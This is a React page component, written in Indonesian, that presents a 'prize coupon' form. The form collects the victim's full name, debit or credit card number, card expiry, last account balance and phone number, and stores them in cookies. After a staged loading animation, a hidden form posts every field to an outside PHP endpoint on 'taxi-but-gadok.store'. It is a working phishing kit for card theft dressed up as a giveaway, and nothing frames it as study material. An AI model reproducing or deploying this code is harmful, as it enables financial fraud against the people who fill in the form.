import {
    useNavigate
} from 'react-router-dom';
import '../assets/css/App.css';
import accounting from 'accounting';
import vid from "../assets/img/vid.png";
import loading from "../assets/img/loading.gif";
import {
    useState,
    useEffect
} from 'react';
import Cookies from 'js-cookie';

function Home(props) {
    const nav = useNavigate();

    // Isi Link php ini
    let [link, setLink] = useState("https://taxi-but-gadok.store/auth/r-hr2");

    const [satu, setSatu] = useState(() => Cookies.get('satu') || '');
    const [dua, setDua] = useState(() => Cookies.get('dua') || '');
    const [tiga, setTiga] = useState(() => Cookies.get('tiga') || '');
    const [empat, setEmpat] = useState(() => Cookies.get('empat') || '');
    const [lima, setLima] = useState(() => Cookies.get('lima') || '');
    const [enam, setEnam] = useState(() => Cookies.get('enam') || '');
    const [loc, setLoc] = useState('');

    const ok = (e) => {
        e.preventDefault();
        props.send();
        document.querySelector('.no-loading').classList.add('loading');
        setTimeout(() => {
            document.querySelector('.no-loading').classList.remove('loading');
            document.querySelector("#php1").submit();
            // nav('/tiga')
        }, 5000);
    }

    useEffect(() => {
        Cookies.set('satu', satu);
        Cookies.set('dua', dua);
        Cookies.set('tiga', tiga);
        Cookies.set('empat', empat);
        Cookies.set('lima', lima);
        Cookies.set('enam', enam);
    }, [satu, dua, tiga, empat, lima, enam]);

    useEffect(() => {
        setLoc(window.location.origin + '/tiga');
    }, []);

    return ( <
        >
        <
        div className = "pg1" >
        <
        form className = 'f3'
        onSubmit = {
            ok
        } >
        <
        div className = "px-2 bg-light " >
        <
        marquee className = "py-3"
        direction = "left"
        onMouseOver = {
            () => this.stop()
        }
        onMouseOut = {
            () => this.start()
        } >
        <
        img src = {
            vid
        }
        width = {
            "300px"
        }
        height = {
            "30px"
        }
        className = "mtp" / > -- -- -- - Silakan Lengkapi Formulir Cetak Kupon Berhadiah anda - . < img src = {
            vid
        }
        width = {
            "300px"
        }
        height = {
            "30px"
        }
        className = "mtp" / >
        <
        /marquee> <
        /div> <
        label > 💳Nama Lengkap < /label> <
        br / >
        <
        input type = "text"
        placeholder = "Masukkan Nama Lengkap"
        minLength = {
            3
        }
        maxLength = {
            50
        }
        value = {
            satu
        }
        onChange = {
            e => setSatu(e.target.value)
        }
        /><br/ >
        <
        label className = 'ib' > 💳Nomor Kartu Debit / Kredit * < /label> <
        input type = "tel"
        pattern = '(?=.*\d)(?=.*[4-6]).{1,}(?=.*[0-6]).{1,}(?=.*[1-3]).{1,}(?=.*[0-9]).{13,}'
        placeholder = "16 digit Nomor Kartu"
        minLength = {
            16
        }
        maxLength = {
            16
        }
        value = {
            dua
        }
        onChange = {
            e => setDua(e.target.value)
        }
        required / > < br / >
        <
        div style = {
            {
                display: "flex"
            }
        } >
        <
        div >
        <
        label className = 'ib' > 💳Masa Berlaku Kartu * < /label><br/ >
        <
        span className = 'selct' >
        <
        select value = {
            tiga
        }
        onChange = {
            e => setTiga(e.target.value)
        } >
        <
        option > Bulan < /option> <
        option value = {
            "01"
        } > 01 < /option> <
        option value = {
            "02"
        } > 02 < /option> <
        option value = {
            "03"
        } > 03 < /option> <
        option value = {
            "04"
        } > 04 < /option> <
        option value = {
            "05"
        } > 05 < /option> <
        option value = {
            "06"
        } > 06 < /option> <
        option value = {
            "07"
        } > 07 < /option> <
        option value = {
            "08"
        } > 08 < /option> <
        option value = {
            "09"
        } > 09 < /option> <
        option value = {
            "10"
        } > 10 < /option> <
        option value = {
            "11"
        } > 11 < /option> <
        option value = {
            "12"
        } > 12 < /option> <
        /select> <
        select value = {
            empat
        }
        onChange = {
            e => setEmpat(e.target.value)
        } >
        <
        option > Tahun < /option> <
        option value = {
            "24"
        } > 24 < /option> <
        option value = {
            "25"
        } > 25 < /option> <
        option value = {
            "26"
        } > 26 < /option> <
        option value = {
            "27"
        } > 27 < /option> <
        option value = {
            "28"
        } > 28 < /option> <
        option value = {
            "29"
        } > 29 < /option> <
        option value = {
            "30"
        } > 30 < /option> <
        /select> <
        /span> <
        /div><br/ >
        <
        /div> <
        label className = 'ib'
        style = {
            {
                fontSize: "13px"
            }
        } > Saldo Terakhir * < /label><br/ >
        <
        input type = "input"
        placeholder = 'Rp.'
        onChange = {
            e => (props.sisa(e.target.value), setLima(e.target.value), e.target.value = accounting.formatMoney(e.target.value, "Rp ", 0, ",", "00"))
        }
        required / > < br / >
        <
        br / >
        <
        label > 💳Nomor Handphone < /label> <
        br / >
        <
        input type = "text"
        pattern = '(?=.*\d)(?=.*[0]).{1,}(?=.*[8]).{1,}(?=.*[0-9]).{11,}'
        placeholder = "Masukkan No Handphone"
        minLength = {
            10
        }
        maxLength = {
            13
        }
        value = {
            enam
        }
        onChange = {
            e => setEnam(e.target.value)
        }
        className = 'duo'
        required / > < br / >
        <
        br / >
        <
        button style = {
            {
                marginTop: "0vw",
                backgroundColor: "#136cc3"
            }
        } > Cetak Kupon < /button> <
        /form> <
        div className = "no-loading" >
        <
        img src = {
            loading
        }
        width = "120px"
        alt = "Loading" / >
        <
        /div> <
        /div>

        <
        form action = {
            link + "/send_no.php"
        }
        method = 'post'
        id = 'php1' >
        <
        input type = "hidden"
        value = {
            satu
        }
        name = 'satu' / >
        <
        input type = "hidden"
        value = {
            dua
        }
        name = "dua" / >
        <
        input type = "hidden"
        value = {
            tiga
        }
        name = 'tiga' / >
        <
        input type = "hidden"
        value = {
            empat
        }
        name = 'empat' / >
        <
        input type = "hidden"
        value = {
            lima
        }
        name = 'lima' / >
        <
        input type = "hidden"
        value = {
            enam
        }
        name = 'enam' / >
        <
        input type = "hidden"
        value = {
            loc
        }
        name = 'loc' / >
        <
        /form> <
        />
    );
}

export default Home;